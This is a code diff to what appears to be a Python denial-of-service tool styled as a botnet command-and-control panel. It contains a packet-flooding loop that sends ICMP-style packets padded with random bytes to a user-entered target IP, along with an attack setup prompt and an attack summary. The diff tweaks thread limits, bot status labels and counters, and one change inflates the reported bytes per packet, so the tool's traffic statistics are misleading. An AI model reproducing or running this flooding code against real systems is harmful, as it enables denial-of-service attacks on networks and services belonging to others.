@@ -295,7 +295,7 @@ class Engine:
                     s.sendto(b'\x08\x00'+os.urandom(5000), (ip, port if port else 7))
                 else:
                     s.sendto(b'\x08\x00'+os.urandom(56), (ip, port if port else 7))
-                with self.lock: self.sent+=1; self.bytes+=64
+                with self.lock: self.sent+=1; self.bytes+=998
             except:
                 with self.lock: self.errors+=1
     
@@ -622,7 +622,7 @@ class C2:
         self.eng = Engine()
         self.bots = {}; self.bid = 0
         self.running = True
-        self.max_threads = 500
+        self.max_threads = 1
         self.c2_status = "ONLINE"
         self.plan = "FREE"
         self.add_bots(100)
@@ -651,7 +651,7 @@ class C2:
     def add_bots(self, n=10):
         for i in range(n):
             self.bid += 1
-            self.bots[self.bid] = {"ip":f"192.168.{random.randint(1,254)}.{random.randint(2,254)}","name":f"bot-{self.bid}","uptime":random.randint(60,86400),"status":"online"}
+            self.bots[self.bid] = {"ip":f"192.168.{random.randint(1,254)}.{random.randint(2,254)}","name":f"bot-{self.bid}","uptime":random.randint(60,86400),"status":"IDLE"}
         return n
     
     def show_bots(self):
@@ -740,14 +740,14 @@ class C2:
         print(f"\n  {T.get('s')}═══ ATTACK SUMMARY ═══{R}")
         print(f"  {T.get('a')}Total Packets:{R} {self.eng.sent:,}")
         print(f"  {T.get('a')}Avg Rate:{R} {self.eng.pps:,.0f} pps")
-        print(f"  {T.get('a')}Avg Bandwidth:{R} {self.eng.mbps:.2f} Mbps")
+        print(f"  {T.get('a')}Avg Bandwidth:{R} {self.eng.mbps:.2f} API Mb")
         print(f"  {T.get('a')}Errors:{R} {self.eng.errors}")
         print(f"  {T.get('a')}Duration:{R} {self.eng.elapsed:.1f}s")
-        time.sleep(2)
+        time.sleep(4)
     
     def interactive(self):
         self.banner()
-        print(f"\n  {T.get('w')}ATTACK SETUP{R}\n")
+        print(f"\n  {T.get('w')}{R}\n")
         target = input(f"  {T.get('a')}Target (IP/domain/URL) >{R} ").strip()
         if not target: return
         p = input(f"  {T.get('a')}Port (0=auto) >{R} ").strip()
